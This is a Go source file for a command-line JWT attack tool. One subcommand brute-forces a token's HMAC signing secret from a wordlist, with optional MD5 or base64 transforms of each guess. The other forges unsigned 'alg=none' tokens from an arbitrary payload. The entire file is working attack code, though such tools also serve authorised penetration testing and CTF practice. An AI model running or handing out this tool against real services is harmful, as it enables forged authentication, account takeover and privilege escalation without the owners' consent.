package main

import (
    "fmt"
    "os"
    "io/ioutil"
    "flag"
    "strings"
    "errors"
    "encoding/base64"
    "time"
    "crypto/md5"
    "encoding/hex"

    "github.com/golang-jwt/jwt"
)


func main() {

    type MyFlagSet struct {
        *flag.FlagSet
        cmdComment string
    }

    //define crack options
    crackCmd := &MyFlagSet {
        FlagSet:    flag.NewFlagSet("crack", flag.ExitOnError),
        cmdComment: "[brute force jwt key]",
    }
    tf := crackCmd.String("tf", "", "path of token file")
    kf := crackCmd.String("kf", "", "path of key file")
    em := crackCmd.String("em", "none", "encryption method of key [none(default), md5, md5_len16, base64]")

    //define encode options
    encodeCmd := &MyFlagSet {
        FlagSet:    flag.NewFlagSet("encode", flag.ExitOnError),
        cmdComment: "[generate jwt token(alg=none)]",
    }
    pf := encodeCmd.String("pf", "", "path of payload file")

    subcommands := map[string] *MyFlagSet {
        crackCmd.Name(): crackCmd,
        encodeCmd.Name(): encodeCmd,
    }

    //print usage
    usage := func () {
        fmt.Printf("Usage: jwtCracker COMMAND [options]\n\n")
        for _, v := range subcommands {
            fmt.Printf("%s %s\n", v.Name(), v.cmdComment)
            v.PrintDefaults()
        }
        os.Exit(2)
    }

    //no input subcommands
    if len(os.Args) < 3 {
        usage()
    }


    //check parameters (crack or encode)
    cmd := subcommands[os.Args[1]]
    if cmd == nil {
        usage()
    }

    //parse sub-parameters
    cmd.Parse(os.Args[2:])

    if os.Args[1] == "crack" {
        start := time.Now()

        //get jwt token from token file
        tokenContent, err := ioutil.ReadFile(*tf)
        if err != nil {
            panic(err)
        }
        tokenString := string(tokenContent)

        //get secret from key file
        keyContent, err := ioutil.ReadFile(*kf)
        if err != nil {
            panic(err)
        }

        encryptMethod := *em
        keys := strings.Split(string(keyContent), "\n")    

        //brute force keys
        for _, key := range keys {
            //compatible CRLF
            key = strings.Replace(key, "\r", "", -1)
            if encryptMethod == "base64" {
                key = base64.StdEncoding.EncodeToString([]byte(key))
            } else if encryptMethod == "md5" {
                key = EncodeMD5(key)
            } else if encryptMethod == "md5_len16" {
                key = Encode16MD5(key)
            }
            //verify token
            resultKey := KeyBrute(tokenString, key)
            if resultKey != nil {
                fmt.Println("found key:", resultKey)
                break
            }
        }    

        //print execution time
        cost := time.Since(start)
        fmt.Printf("Execution time:[%s]",cost)

    }

    if os.Args[1] == "encode" {
        payloadContent, err := ioutil.ReadFile(*pf)
        if err != nil {
            panic(err)
        }    

        payloadString := strings.Replace(string(payloadContent), "\n", "", -1)
        payload := []byte(payloadString)    

        noneAlgToken := NoneAlgEncode(payload)
        fmt.Println(noneAlgToken)
    }
}

func EncodeMD5(data string) string {
    h := md5.New()
    h.Write([]byte(data))
    return hex.EncodeToString(h.Sum(nil))
}

func Encode16MD5(data string) string{
    return EncodeMD5(data)[8:24]
}

func KeyBrute(tokenString, key string) interface{} {
    token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
        return []byte(key), nil
    })

    if token.Valid {
        return key
    } else if errors.Is(err, jwt.ErrTokenMalformed) {    //cancel verification if the token format is incorrect
        panic("token is invalid")
    } else if !errors.Is(err, jwt.ErrTokenSignatureInvalid) {  //If the error does not contain ErrTokenSignatureInvalid, the key is correct
        return key
    } else {
        return nil
    }

}

func NoneAlgEncode(payload []byte) string {
    //avoid padding with "=" when base64 encoding
    var RawStdEncoding = base64.StdEncoding.WithPadding(-1)
    //define the header of "alg=none"
    header := []byte("{\"alg\": \"none\",\"typ\": \"JWT\"}")
    //get the header encoded with base64
    jwtHeader := RawStdEncoding.EncodeToString(header)
    //get the payload encoded with base64
    jwtPayload := RawStdEncoding.EncodeToString(payload)
    //get the jwt token of "alg=none"
    jwtToken := jwtHeader + "." + jwtPayload + "."

    return jwtToken
}
